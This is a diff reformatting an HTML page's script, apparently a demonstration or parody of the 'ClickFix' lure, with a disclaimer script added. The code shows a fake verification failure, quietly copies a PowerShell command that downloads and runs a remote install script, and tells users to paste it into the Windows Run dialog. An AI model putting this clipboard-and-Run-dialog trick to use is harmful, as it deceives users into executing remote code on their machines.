@@ -121,7 +121,7 @@
           "#C0FFEE",
           "#BADA55",
           "#123456",
-          "#654321"
+          "#654321",
         ];
         for (var i = 1; i <= 9; i++) {
           document.getElementById("cube" + i).style.backgroundColor =
@@ -134,21 +134,28 @@
         }, 3500);
 
         // New event listener for the "Click Here" button
-        document.querySelector('#verification-page a').addEventListener('click', function(e) {
-          e.preventDefault();
-          var vp = document.getElementById('verification-page');
-          vp.innerHTML = '<h1>Verifying...</h1>';
-          setTimeout(function(){
-            vp.innerHTML =
-              '<h1>Verification Failed</h1>' +
-              '<p>We failed to verify that your phone was happy.</p>' +
-              '<p>Please press WIN+R, then paste the text that has been copied in the Run dialog, and press Enter to confirm that your phone is happy.</p>';
-            navigator.clipboard.writeText('powershell -c "irm bun.sh/install.ps1 | iex" # Verification ID ✅: 20KM8B9M30PF8MN8301BD34F7FUY5BB8A900C').catch(function(err){
-              console.error("Clipboard error:", err);
-            });
-          }, 2000);
-        });
+        document
+          .querySelector("#verification-page a")
+          .addEventListener("click", function (e) {
+            e.preventDefault();
+            var vp = document.getElementById("verification-page");
+            vp.innerHTML = "<h1>Verifying...</h1>";
+            setTimeout(function () {
+              vp.innerHTML =
+                "<h1>Verification Failed</h1>" +
+                "<p>We failed to verify that your phone was happy.</p>" +
+                "<p>Please press WIN+R, then paste the text that has been copied in the Run dialog, and press Enter to confirm that your phone is happy.</p>";
+              navigator.clipboard
+                .writeText(
+                  'powershell -c "irm bun.sh/install.ps1 | iex" # Verification ID ✅: 20KM8B9M30PF8MN8301BD34F7FUY5BB8A900C'
+                )
+                .catch(function (err) {
+                  console.error("Clipboard error:", err);
+                });
+            }, 2000);
+          });
       };
     </script>
   </body>
+  <script src="/disclaimer.js" async></script>
 </html>
